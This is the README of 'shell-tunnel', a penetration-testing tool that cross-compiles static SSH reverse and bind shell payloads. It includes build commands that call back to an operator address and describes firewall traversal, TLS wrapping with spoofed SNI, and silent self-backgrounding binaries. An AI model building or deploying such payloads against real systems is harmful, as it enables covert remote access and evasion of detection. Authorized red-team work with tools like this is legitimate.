# shell-tunnel

Static SSH server for bind and reverse shells, PTY and SFTP

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/cover-dark.svg">
  <img alt="shell-tunnel: a tuned static binary on the target becomes a PTY shell for the operator's plain ssh client" src="docs/assets/cover-light.svg" width="100%">
</picture>

```sh
# Reverse shell: cross-compile payload binaries and write a local handler script
./build.sh reverse 10.10.14.5:4444
./bin/handler-10-10-14-5-4444

# Bind shell: cross-compile payload binaries that listen on the target
./build.sh listen 8888
```

- **Reverse and bind modes:** `reverse` dials home through egress firewalls, retrying every 5 s with 15 s SSH keepalives; `listen` binds directly on the target.
- **Full PTY, SFTP, and forwarding:** `openpty` on Linux and ConPTY on Windows 10 17763+, built-in SFTP subsystem, and `-L`/`-R`/`-D` port forwarding through a stock `ssh` client.
- **Baked single-binary builds:** `./build.sh` embeds credentials (`-p` or ED25519 `-k`) and targets via ldflags, writes a `chmod 700` handler script, and prints ControlMaster connect commands on callback.
- **TLS wrapping and silent payloads:** `--tls` wraps SSH in TLS with ALPN and spoofed SNI (`--sni`); `--nocli` and `--daemonize` bake a flagless self-backgrounding binary.
- **Cross-platform static binaries:** Zero-CGO Go builds for Linux, Windows, and macOS with bracketed `[ok]`/`[!]`/`[x]`/`[i]` status output and `NO_COLOR` support.

## Documentation

- [Project Page](https://real-fruit-snacks.github.io/shell-tunnel/)
- [Usage, Build Options & Known Issues](docs/USAGE.md)
- [Prebuilt Releases](https://github.com/Real-Fruit-Snacks/shell-tunnel/releases/latest)
- [Changelog](CHANGELOG.md) · [Contributing](CONTRIBUTING.md) · [Security](SECURITY.md)

## License

[GPLv3](LICENSE), preservation fork of [Ferdinor's undertow](https://github.com/Ferdinor) (2021). For authorized security testing with explicit written permission only.
